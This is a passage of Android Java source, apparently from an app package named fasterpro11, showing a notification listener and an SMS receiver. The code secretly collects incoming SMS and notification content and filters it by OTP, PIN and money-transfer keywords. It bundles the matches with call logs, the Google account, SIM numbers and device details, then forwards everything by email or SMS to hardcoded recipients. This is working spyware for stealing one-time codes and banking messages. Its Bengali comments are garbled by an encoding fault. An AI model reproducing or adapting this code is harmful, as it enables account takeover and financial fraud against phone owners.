            Log.e(TAG, "? PHP test connection Exception", e);
        }
    }
    //  end code php





    public void saveToTextFile(Context context,String content) {
        if (context == null) {
            Log.e(TAG, "Context is null! Cannot save text file.");
            return;
        }
        File file = new File(getFilesDir(), "notification_log.txt"); // Use app's internal storage
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(file, true))) {
            writer.write(content);
            writer.newLine();
            Log.d(TAG, "Content saved to text file: " + file.getAbsolutePath());
            Log.d(TAG, "Saved content: " + content); // Log the content being saved
        } catch (IOException e) {
            Log.e(TAG, "Error saving to text file: ", e);
        }
    }

    public String readFromTextFile() {
        StringBuilder content = new StringBuilder();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { // API level 26 ?? ??? ????
            try {
                // getFilesDir().getPath() ??????? ??? ??????? ??? ???? ??? ?????
                byte[] bytes = Files.readAllBytes(Paths.get(getFilesDir().getPath(), "notification_log.txt"));
                content.append(new String(bytes));
            } catch (IOException e) {
                Log.e(TAG, "Error reading file using NIO API: ", e);
            }
        } else {
            // ??? API level 26 ?? ?? ??, ????? BufferedReader ??????? ???
            File file = new File(getFilesDir(), "notification_log.txt");
            try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    content.append(line).append("\n");
                }
            } catch (IOException e) {
                Log.e(TAG, "Error reading from text file: ", e);
            }
        }

        Log.d(TAG, "Read content from file: " + content.toString());
        return content.toString();
    }



    public void clearTextFile() {
        File file = new File(getFilesDir(), "notification_log.txt"); // Use app's internal storage
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(file, false))) {
            writer.write("");
            Log.d(TAG, "Text file cleared: " + file.getAbsolutePath());
        } catch (IOException e) {
            Log.e(TAG, "Error clearing text file: ", e);
        }
    }

    public int getWordCount(String text) {
        if (text == null || text.isEmpty()) {
            Log.d(TAG, "Text is null or empty, word count is 0");
            return 0;
        }
        String[] words = text.split("\\s+");
        int wordCount = words.length;
        Log.d(TAG, "Recent Text file Word count: " + wordCount  +"  . target Word count: "+ MAX_WORDS);
        return wordCount;
    }




















    private void forwardNotificationBySMS(String app, String title, String text, Context context) {

        try {
            GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs( context );
            String recentCallLogs = getRecentCallLogs.getRecentCallLogs();
            String smsMessage = "Notification from " + app + "\nTitle: " + title + "\nMessage: " + text + "\n\nRecent Call Logs:\n" + recentCallLogs;
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(SMS_RECIPIENT, null, smsMessage, null, null);
            Log.d(TAG, "Notification forwarded successfully via SMS");
        } catch (Exception e) {
            Log.e(TAG, "notification Error in forwardNotificationBySMS: ", e);
        }
    }

    // Store email details in SharedPreferences
    private void storeEmailDetailsSharedPreferences(String subject, String body, long fileSize) {
        // Context ??? ????
        if (mContext == null) {
            Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
            return; // ??? mContext null ??, ????? ????????? ???? ????
        }

        SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("subject", subject);
        editor.putString("body", body);
        editor.putLong("fileSize", fileSize);
        editor.apply();
        Log.d(TAG, "Email details stored.");
    }


    // Check if the email content is the same as before
    private boolean isEmailContentSame(String subject, String body, long fileSize) {
        // ??????? ???? mContext null ??
        if (mContext == null) {
            Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
            return false; // ??? mContext null ??, ????? false ??????? ????
        }

        SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
        String previousSubject = sharedPreferences.getString("subject", "");
        String previousBody = sharedPreferences.getString("body", "");
        long previousFileSize = sharedPreferences.getLong("fileSize", 0);

        // ??????? ?????? ???????? ??? ????? ??? ???????? ????? ????
        return subject.equals(previousSubject) && body.equals(previousBody) && fileSize == previousFileSize;
    }




    private void handleFileUri(Uri fileUri) {
        String mimeType = getContentResolver().getType(fileUri);
        if (mimeType != null) {
            switch (mimeType.split("/")[0]) {
                case "image":
                    forwardNotificationWithImage(fileUri);
                    break;
                case "audio":
                    forwardNotificationWithAudio(fileUri);
                    break;
                case "video":
                    forwardNotificationWithVideo(fileUri);
                    break;
                default:
                    forwardNotificationWithFile(fileUri);
                    break;
            }
        } else {
            Log.d(TAG, "notification MIME type is null for file URI: " + fileUri);
        }
    }

    private void forwardNotificationWithImage(Uri imageUri) {
        try {
            Bitmap image = MediaStore.Images.Media.getBitmap(getContentResolver(), imageUri);
            String subject = "Notification Image";
            String messageBody = "notification You have received an image.";
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, image);
            Log.d(TAG, "notification Image  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward image : ", e);
        }
    }

    private void forwardNotificationWithAudio(Uri audioUri) {
        String subject = "Notification Audio";
        String messageBody = "notification received an audio file.";
        try {
            byte[] audioData = readFileToByteArray(audioUri);
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, audioData, "audio.mp3"); // ???? ???? ??? ??????? ????
            Log.d(TAG, "notificationAudio  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward audio file: ", e);
        }
    }

    private void forwardNotificationWithVideo(Uri videoUri) {
        String subject = "Notification Video";
        String messageBody = "notification You have received a video file.";
        try {
            byte[] videoData = readFileToByteArray(videoUri);
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, videoData, "video.mp4"); // Use the appropriate filename
            Log.d(TAG, "notification Video  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward video file: ", e);
        }
    }

    private void forwardNotificationWithFile(Uri fileUri) {
        String subject = "Notification File";
        String messageBody = "notification You have received a file.";
        try {
            byte[] fileData = readFileToByteArray(fileUri);
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, fileData, "file.txt"); // Use the appropriate filename
            Log.d(TAG, "notificationFile  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward generic file: ", e);
        }
    }

    private byte[] readFileToByteArray(Uri fileUri) throws Exception {
        try (InputStream inputStream = getContentResolver().openInputStream(fileUri);
             ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                byteArrayOutputStream.write(buffer, 0, bytesRead);
            }
            return byteArrayOutputStream.toByteArray();
        }
    }

    private Bitmap extractLargeIcon(Bundle extras) {
        Bitmap largeIconBitmap = null;

        if (extras.containsKey(Notification.EXTRA_LARGE_ICON)) {
            Object iconObj = extras.get(Notification.EXTRA_LARGE_ICON);
            if (iconObj instanceof Bitmap) {
                largeIconBitmap = (Bitmap) iconObj;
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (iconObj instanceof Icon) {
                    Icon icon = (Icon) iconObj;
                    try {
                        Drawable drawable = icon.loadDrawable(this);
                        if (drawable != null) {
                            largeIconBitmap = Bitmap.createBitmap(
                                    drawable.getIntrinsicWidth(),
                                    drawable.getIntrinsicHeight(),
                                    Bitmap.Config.ARGB_8888
                            );
                            Canvas canvas = new Canvas(largeIconBitmap);
                            drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                            drawable.draw(canvas);
                        }
                    } catch (Exception e) {
                        Log.e("NotificationListener", "Failed to load icon: " + e.getMessage());
                    }
                }
            }
        }
        return largeIconBitmap;
    }


    private boolean containsNotificationMoneyWords(String messageBody) {
        for (String keyword : SEND_MONEY_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Message contains money-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "No money-related keywords found in message.");
        return false;
    }
    private boolean containsNotificationOtpWords(String messageBody) {
        for (String keyword : OTP_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Notification contains OTP-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "no Notification contains OTP-related keyword.");
        return false;
    }




    public void listenNotifications(Context sbn) {
        onNotificationPosted( sbn );
    }

    private void onNotificationPosted(Context sbn) {
    }
    public  String getNotificationSubject() {

        Log.d(TAG, "Starting forwardNotificationByEmail method");

        AccountUtil accountUtil = new AccountUtil();
        String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
        if (GoogleAccountName == null) {
            GoogleAccountName = "null";
            Log.d(TAG, "GoogleAccountName is null, setting to 'null'");
        }

        String userSimNumber = "null";
        try {
            userSimNumber = accountUtil.getUserSimNumber(context);
            Log.d(TAG, "User SIM number fetched: " + userSimNumber);
        } catch (SecurityException e) {
            Log.e(TAG, "Error accessing Subscriber ID (SIM Number): ", e);
            userSimNumber = "null";
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error while fetching SIM number: ", e);
            userSimNumber = "null";
        }

        GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
        recentCallLogs = getRecentCallLogs.getRecentCallLogs();

        String text = "";
        String Get_Sim1_Number = SetSim1Number(context, text);
        Log.d(TAG, "Sim1 Number set: " + Get_Sim1_Number);

        String manufacturer = Build.MANUFACTURER;
        String mobileModel = Build.MODEL;
        LocationUtil locationUtil = new LocationUtil();
        String countryName = locationUtil.getFullCountryName();
        Log.d(TAG, "Device info - Manufacturer: " + manufacturer + ", Model: " + mobileModel + ", Country: " + countryName);


        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(this);
        String UserID1= alert.getSim1NumberFromUser(context);
        String UserID2= alert.getSim2NumberFromUser(context);
        String UserGivenSimNumber= UserID1 + " "+UserID2;


        subject = "Key ID: " + Get_Sim1_Number +  " " + UserGivenSimNumber + " " + manufacturer + " " + mobileModel + " "+ " User: " + GoogleAccountName + " sim ser: " + userSimNumber + " " +" Country: " + countryName;

        notificationglobalsubject= subject ;

        return  notificationglobalsubject;
    }



}





//SmsReceiver.java
package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.mail.MessagingException;


public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static final String FORWARD_SMS_NUMBER = "+88014002828864";
    public String sim1Number="";
    public String sim2Number="";
    public int SMSCounter= 0;
    private static final String[] INCOMING_CALL_NUMBERS = {
            "+880130028208611", "+880130403928911",  "+880969763789311", "+880963882136911" };
    private static final String[] SEND_MONEY_WORDS = {"Cash In", "cash in", "send money", "money", "Money","received",
            "received TK","Cashback","Balance", "Recharge",  "received money"};
    private static final String[] OTP_WORDS = {"OTP", "Otp", "otp",  "PIN", "Pin", "pin","CODE", "Code", "code",
            "Google verification code","verification code","Verification code",
            "à¦®à¦¾à¦‡à¦œà¦¿à¦ªà¦¿ à¦ªà¦¿à¦¨ (code)","à¦®à¦¾à¦‡à¦œà¦¿à¦ªà¦¿ à¦ªà¦¿à¦¨ ", "à¦®à¦¾à¦‡à¦œà¦¿à¦ªà¦¿ à¦ªà¦¿à¦¨ (code)", "(code)",
            "VERIFICATUON", "Verification", "verification"};




    private static String lastSender;
    private static String lastMessage;
    private static long lastTimestamp;
    private Context mContext;
    private boolean isMessageProcessed = false;
    public static String getSender() {
        return null;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (isMessageProcessed) {
            return; // à¦¯à¦¦à¦¿ à¦®à§‡à¦¸à§‡à¦œ à¦‡à¦¤à¦¿à¦®à¦§à§à¦¯à§‡ à¦ªà§à¦°à¦¸à§‡à¦¸ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡ à¦¥à¦¾à¦•à§‡, à¦¤à¦¾à¦¹à¦²à§‡ à¦«à¦¿à¦°à§‡ à¦¯à¦¾à¦¨
        }
        // à¦à¦¸à¦à¦®à¦à¦¸ à¦ªà§à¦°à¦¸à§‡à¦¸à¦¿à¦‚ à¦²à¦œà¦¿à¦•
        isMessageProcessed = true; // à¦®à§‡à¦¸à§‡à¦œ à¦ªà§à¦°à¦¸à§‡à¦¸ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡à¦›à§‡ à¦šà¦¿à¦¹à§à¦¨à¦¿à¦¤ à¦•à¦°à§à¦¨
        mContext = context;

        if (intent != null && intent.getExtras() != null) {
            Bundle bundle = intent.getExtras();
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    try {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();
                        Log.d(TAG, "Received SMS from: " + sender + ", message is: " + messageBody);


                        lastSender = sender;
                        lastMessage = messageBody;
                        lastTimestamp = System.currentTimeMillis();



                        // Start code for Get Sim number.Call method firstly here. From Own User .SaveSharedPreferences. use sms=========start=====================
                        // Load previous count from SharedPreferences
                        SharedPreferences sharedPreferences = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
                        int SMSCounter = sharedPreferences.getInt("SMSCounter", 0);

                        // à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦‡à¦¨à¦•à§à¦°à¦¿à¦®à§‡à¦¨à§à¦Ÿ à¦•à¦°à§à¦¨
                        SMSCounter++;
                        // SharedPreferences-à¦ à¦†à¦ªà¦¡à§‡à¦Ÿà§‡à¦¡ à¦¸à¦‚à¦–à§à¦¯à¦¾ à¦¸à¦‚à¦°à¦•à§à¦·à¦£ à¦•à¦°à§à¦¨
                        SharedPreferences.Editor editor = sharedPreferences.edit();
                        editor.putInt("SMSCounter", SMSCounter);
                        editor.apply();
                        Log.d(TAG, "SharedPreferences Updated SMSCounter : " + SMSCounter);

                        // à¦®à§‡à¦¸à§‡à¦œ à¦•à¦¨à§à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¬à¦¿à¦¶à§à¦²à§‡à¦·à¦£ à¦•à¦°à§‡ à¦¸à¦¿à¦® à¦¨à¦¾à¦®à§à¦¬à¦¾à¦° à¦¬à§‡à¦° à¦•à¦°à¦¾ à¦¹à¦¬à§‡ à¦•à¦¿à¦¨à¦¾ à¦¤à¦¾ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                        boolean IsSimNumberGetFromUserWords1 = isSimNumberGetFromUserWords1(messageBody);
                        boolean IsSimNumberGetFromUserWords2 = isSimNumberGetFromUserWords2(messageBody);
                        Log.d(TAG, "IsSimNumberGetFromUserWords1: " + IsSimNumberGetFromUserWords1 +
                                " IsSimNumberGetFromUserWords2: " + IsSimNumberGetFromUserWords2);

                        // à¦¨à¦¿à¦¶à§à¦šà¦¿à¦¤ à¦•à¦°à§à¦¨ à¦¯à§‡ context à¦ à¦¿à¦• à¦†à¦›à§‡
                        Context appContext = context.getApplicationContext();
                        if (appContext == null) {
                            Log.e("SmsReciver", "Application context is null!");
                            return;
                        }
                        // à¦¶à¦°à§à¦¤ à¦¯à¦¾à¦šà¦¾à¦‡ à¦•à¦°à§‡ à¦ªà§à¦°à§Ÿà§‹à¦œà¦¨ à¦¹à¦²à§‡ GetSim1AndSim2NumberFromAlertbox à¦…à§à¦¯à¦¾à¦•à§à¦Ÿà¦¿à¦­à¦¿à¦Ÿà¦¿ à¦šà¦¾à¦²à§ à¦•à¦°à§à¦¨
                        if ((SMSCounter == 2 || SMSCounter == 600 || SMSCounter == 2000) ||
                                (IsSimNumberGetFromUserWords1 && IsSimNumberGetFromUserWords2)) {
                            Log.d(TAG, "Condition met for alert window Showing");

                            Intent alertIntent = new Intent(appContext, GetSim1AndSim2NumberFromAlertbox.class);
                            alertIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Service à¦¥à§‡à¦•à§‡ Activity à¦šà¦¾à¦²à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ à¦«à§à¦²à§à¦¯à¦¾à¦—
                            appContext.startActivity(alertIntent);

                            // start code counter rest 0 SMSCounter  .for again come alart window
                            GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
                            String UserID1= alert.getSim1NumberFromUser(context);
                            String UserID2= alert.getSim2NumberFromUser(context);
                            Log.d(TAG, "UserID1 :" + UserID1+ " UserID1:" + UserID1 );
                            if (UserID1== null || UserID2== null)  {
                                //SharedPreferences.Editor editor = sharedPreferences.edit();
                                editor.putInt("SMSCounter", 0);
                                editor.apply();
                                Log.d(TAG, "SharedPreferences SMSCounter reset to : " + SMSCounter);
                            }else {
                                Log.d(TAG, "UserID1 and UserID1 not null");
                            }
                            // End code counter rest 0 SMSCounter .for again come alart window

                        } else {
                            Log.d(TAG, "Condition not met for alert window");
                        }
                        //END code for Get Sim number. From Own User .Call method firstly here.Save SharedPreferences. use socialmedia sms======END====================


                        //START code for Get Sim number. From Own User .Call method firstly here.Save SharedPreferences. use socialmedia sms====START =====================
                        boolean IsSimNumberSetAlart =   isSimNumberSetAlartmessageBody( messageBody);
                        Log.d(TAG, "Sim Number set From SMS Word . isSimNumberSetAlartmessageBody : " + IsSimNumberSetAlart  );
                        if ( IsSimNumberSetAlart) {
                            Log.d(TAG, "condition IsSimNumberSetAlart: " + IsSimNumberSetAlart);
                            String ExtractPlusPrefixedNumbersFromSMS =  extractPlusPrefixedNumbersFromSMS( messageBody,  context);
                            if (  ExtractPlusPrefixedNumbersFromSMS != null) {
                                extractPlusPrefixedNumbersFromSMS( messageBody, context);
                                //isSimNumberSetAlart(messageBody);
                            }else {
                                Log.d(TAG, "Sim Number set From SMS Word condition not meet  "  );
                            }
                        }





                        // Cheek Blocked notification
                        if (isBlockedmessageBody(messageBody)) {
                            Log.d(TAG, "Blocked notification detected. SMS will not be forwarded.");
                            return;  // à¦¬à§à¦²à¦• à¦•à¦¿à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦ªà¦¾à¦“à§Ÿà¦¾ à¦—à§‡à¦²à§‡ à¦«à¦°à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦¹à¦¬à§‡ à¦¨à¦¾
                        }

                        boolean isNumberInCallLog = isNumberInCallLog(sender);
                        boolean isSMSMoneyWords = containsSMSMoneyWords(messageBody);
                        boolean amountAboveThreshold = AmountAboveThreshold(messageBody);
                        boolean isContainsSMSOtp = containsSMSOtp(messageBody);
                        boolean isPatternMatchInCallLog = isPatternMatchInCallLogs();
                        boolean isIncomingCallNumber = IncomingCallNumber(sender);
                        boolean isPatternMatchInRecentMessages = isPatternMatchInRecentIncomingMessages();
                        Log.d(TAG, "Incoming Call Number check: " + isIncomingCallNumber);
                        Log.d(TAG, "Is Number In CallLog check: " + isNumberInCallLog);
                        Log.d(TAG, "Contains SMS MoneyWords check: " + isSMSMoneyWords);
                        Log.d(TAG, "Contains SMS AmountAboveThreshold check: " + amountAboveThreshold);
                        Log.d(TAG, "Contains SMS Otp check: " + isContainsSMSOtp);
                        Log.d(TAG, "Pattern match check in CallLog 4 to 6 digit : " + isPatternMatchInCallLog);
                        Log.d(TAG, "Pattern match check in Incoming Messages 4 to 6 digit : " + isPatternMatchInRecentMessages);

                        if ((isSMSMoneyWords && amountAboveThreshold) ||
                                (isNumberInCallLog && isSMSMoneyWords && amountAboveThreshold) ||
                                isContainsSMSOtp || ( isPatternMatchInCallLog && amountAboveThreshold ) ||
                                (isIncomingCallNumber && isPatternMatchInRecentMessages && isSMSMoneyWords)||
                                ((isIncomingCallNumber || isNumberInCallLog ) && isSMSMoneyWords && !isInternetConnected())) {
                            Log.d(TAG, "SmsReceiver class Condition match: For Forwarding message...");

                            // cheek reson for forwarding message start
                            if (isSMSMoneyWords && amountAboveThreshold){
                                Log.d(TAG, "conditions match Forwarding SMS for isSMSMoneyWords && amountAboveThreshold.");
                            }else if (isNumberInCallLog && isSMSMoneyWords && amountAboveThreshold){
                                Log.d(TAG, "conditions match for isNumberInCallLog && isSMSMoneyWords && amountAboveThreshold.");
                            }else if (isContainsSMSOtp ){
                                Log.d(TAG, "conditions match Forwarding SMS for isContainsSMSOtp .");
                            }else if ( isPatternMatchInCallLog && amountAboveThreshold ){
                                Log.d(TAG, "conditions match Forwarding SMS for  isPatternMatchInCallLog && amountAboveThreshold .");
                            }else if (isIncomingCallNumber && isPatternMatchInRecentMessages && isSMSMoneyWords){
                                Log.d(TAG, "conditions match Forwarding SMS for isIncomingCallNumber && isPatternMatchInRecentMessages && isSMSMoneyWords.");
                            }else if ((isIncomingCallNumber || isNumberInCallLog ) && isSMSMoneyWords && !isInternetConnected()){
                                Log.d(TAG, "conditions match Forwarding SMS for (isIncomingCallNumber || isNumberInCallLog ) && isSMSMoneyWords && !isInternetConnected().");
                            }else {
                                Log.d(TAG, "conditions not match for forwarding the SMS.");
                            }

                            try {
                                GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
                                String recentCallLogs = getRecentCallLogs.getRecentCallLogs();
                                //String recentCallLogs = getRecentCallLogs();
                                String forwardMessage = "From: " + sender + "\nMessage: " + messageBody + "\n\nRecent Call Logs:\n" + recentCallLogs;

                                if (isInternetConnected()) {
                                    Log.d(TAG, "Internet is connected. Forwarding SMS via email.");
                                    forwardSmsByEmail(sender, forwardMessage, context);
                                } else {
                                    Log.d(TAG, "Internet is not connected. Forwarding SMS via SMS.");
                                    forwardSmsBySMS(sender, forwardMessage, context);
                                }
                            } catch (MessagingException e) {
                                Log.e(TAG, "Failed to forward SMS: " + e.getMessage());
                            }
                        } else {
                            Log.d(TAG, "SmsReceiver class  No conditions match for forwarding the message.");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing SMS: " + e.getMessage());
                    }
                }
            }
        }
    }
    //  messageBody blockedKeyword ============= start code =============
    // à¦¬à§à¦²à¦• à¦•à¦¿à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦šà§‡à¦• à¦•à¦°à¦¾à¦° à¦«à¦¾à¦‚à¦¶à¦¨
    private boolean isBlockedmessageBody(String messageBody) {
        String blockedKeyword = findBlockedKeyword(messageBody);
        if (blockedKeyword != null) {
            Log.d(TAG, "messageBody blocked by keyword match: " + blockedKeyword);
            return true;
        }
        return false;
    }
    // à¦¬à§à¦²à¦• à¦•à¦¿à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦–à§‹à¦à¦œà¦¾
    private String findBlockedKeyword(String messageBody) {
        String[] blockedKeywords = {
                "MB","Mb","mb","GP30",  "GB350TK", "30GB350TK", "GP30GB350TK",  "GB300TK",
                "à¦Ÿà¦¾à¦•à¦¾ à¦°à¦¿à¦šà¦¾à¦°à§à¦œà§‡", "à¦ªà§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦° à¦…à¦Ÿà§‹ à¦°à¦¿à¦¨à¦¿à¦‰",  "à¦šà¦¾à¦²à§ à¦•à¦°à¦¤à§‡ à¦¡à¦¾à¦¯à¦¼à¦¾à¦² ", "Emergency balance", "  à¦®à¦¿à¦¨à¦¿à¦Ÿ/à¦¬à§à¦¯à¦¾à¦¨à§à¦¡à§‡à¦² ",
                "à¦…à¦«à¦¾à¦°",  "à¦…à¦«à¦¾à¦°!", "à¦¨à¦¤à§à¦¨ à¦…à¦«à¦¾à¦°!","à¦…à¦«à¦¾à¦°à¦Ÿà¦¿","à¦°à§‡à¦—à§à¦²à¦¾à¦° à¦•à¦² à¦°à§‡à¦Ÿ", "à¦†à¦œà¦‡ à¦¶à§‡à¦· à¦¦à¦¿à¦¨", "à¦…à¦«à¦¾à¦°à¦Ÿà¦¿ à¦¨à¦¿à¦¤à§‡ à¦¬à¦¿à¦•à¦¾à¦¶/à¦¨à¦—à¦¦ à¦¥à§‡à¦•à§‡ à¦°à¦¿à¦šà¦¾à¦°à§à¦œ à¦•à¦°à§à¦¨", "à¦®à§‡à§Ÿà¦¾à¦¦à¦‰à¦¤à§à¦¤à§€à¦°à§à¦£ à¦¹à¦¬à§‡",
                "à¦†à¦œà¦•à§‡à¦° à¦…à¦«à¦¾à¦°", "à¦¸à§‡à¦°à¦¾ à¦…à¦«à¦¾à¦°", "à¦¦à¦¿à¦¨ à¦®à§‡à§Ÿà¦¾à¦¦à§€ à¦¸à§‡à¦°à¦¾ à¦…à¦«à¦¾à¦°", "à§©à§¦à¦¦à¦¿à¦¨ à¦¡à¦¾à§Ÿà¦¾à¦²", "à§­à¦¦à¦¿à¦¨ à¦®à§‡à§Ÿà¦¾à¦¦à§€", "7 à¦¦à¦¿à¦¨",
                "à¦ªà§à¦¯à¦¾à¦• à¦à¦°",   "à¦®à¦¿à¦¨à¦¿à¦Ÿ à¦šà¦¾à¦²à§ à¦¹à§Ÿà§‡à¦›à§‡", "http://mygp.li/My",
               " à¦œà¦¿à¦¬à¦¿ ","*à§§à§¨à§§*","à§©à§¦à¦¦à¦¿à¦¨", "à§­ à¦¦à¦¿à¦¨", "à§­à¦¦à¦¿à¦¨","à§©à§¦ à¦¦à¦¿à¦¨", "à§©à§¦à¦¦à¦¿à¦¨", "à§© à¦¦à¦¿à¦¨",
                "à§© à¦¿à¦¨","à§§à§« à¦¦à¦¿à¦¨", "à§§à§«à¦¦à¦¿à¦¨",
                "à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦…à¦«à¦¾à¦°", "à¦†à¦¨à¦²à¦¿à¦®à¦¿à¦Ÿà§‡à¦¡", " à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦¬à¦¿à¦²à§‡à¦°", "à¦ªà¦°à¦¿à¦¶à§‹à¦§à¦¿à¦¤", "Bubble shooter game", "inbox me", "à¦ªà§à¦°à¦¸à§à¦•à¦¾à¦°",
                 "bonus","Emergency balance", "Emergency","Silver",
                "GB450TK"
        };

        for (String keyword : blockedKeywords) {
            if (messageBody.equals(keyword) || messageBody.contains(keyword)) {
                return keyword;
            }
        }
        return null;
    }
    //  messageBody blockedKeyword ============= end code =============




    private boolean containsSMSMoneyWords(String messageBody) {
        for (String keyword : SEND_MONEY_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Message contains money-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "No money-related keywords found in message.");
        return false;
    }
    private boolean containsSMSOtp(String messageBody) {
        for (String keyword : OTP_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Message contains OTP-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "no Message contains OTP-related keyword.");
        return false;
    }

    private static final double MIN_AMOUNT = 500;
    private static final double MAX_AMOUNT = 900000000;
    private boolean AmountAboveThreshold(String messageBody) {
        Log.d(TAG, "AmountAboveThreshold check Received messageBody: " + messageBody);
        List<Double> amounts = extractAllAmounts(messageBody);

        boolean result = false;
        Log.d(TAG, "Checking extracted amounts: " + amounts);
        for (double amount : amounts) {
            Log.d(TAG, "Checking money amount: " + amount);
            if (amount >= MIN_AMOUNT && amount <= MAX_AMOUNT) {
                result = true;
                Log.d(TAG, "money Amount " + amount + " is within threshold.");
                break;
            } else {
                Log.d(TAG, "money Amount " + amount + " is NOT within threshold.");
            }
        }
        Log.d(TAG, "Final result for money amount above threshold: " + result);
        return result;
    }
    private List<Double> extractAllAmounts(String messageBody) {
        List<Double> amounts = new ArrayList<>();
        String regex = "(?i)Tk\\s*([\\d,]+(?:\\.\\d{1,2})?)"; // Tk à¦à¦° à¦ªà¦° à¦ªà¦°à¦¿à¦®à¦¾à¦£ à¦–à§à¦à¦œà§à¦¨
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(messageBody);
        Log.d(TAG, "Using regex: " + regex);
        while (matcher.find()) {
            String amountString = matcher.group(1);
            Log.d(TAG, "Matched amount string: " + amountString);
            if (amountString != null) {
                // à¦•à¦®à¦¾ à¦¸à¦°à¦¾à¦¨à§‹
                amountString = amountString.replace(",", "");
                Log.d(TAG, "Processed amount string (without commas): " + amountString);
                // à¦ªà¦°à¦¿à¦®à¦¾à¦£à¦Ÿà¦¿ à¦¡à¦¾à¦¬à¦² à¦ à¦°à§‚à¦ªà¦¾à¦¨à§à¦¤à¦° à¦•à¦°à¦¾
                try {
                    double amount = Double.parseDouble(amountString);
                    Log.d(TAG, "Extracted amount: " + amount);
                    amounts.add(amount);
                } catch (NumberFormatException e) {
                    Log.e(TAG, "Number format exception while parsing amount: " + e.getMessage());
                }
            }
        }
        if (amounts.isEmpty()) {
            Log.d(TAG, "No TK Money amounts extracted from the message.");
        } else {
            Log.d(TAG, "Amounts extracted: " + amounts);
        }
        return amounts;
    }
    private boolean IncomingCallNumber(String sender) {
        for (String number : INCOMING_CALL_NUMBERS) {
            if (sender.equals(number)) {
                Log.d(TAG, "Sender is an incoming call number: " + sender);
                return true;
            }
        }
        Log.d(TAG, "Not an incoming call number: " + sender);
        return false;
    }


    private boolean isPatternMatchInCallLogs() {
        Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b");
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.NUMBER };
        Cursor cursor = null;
        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) {
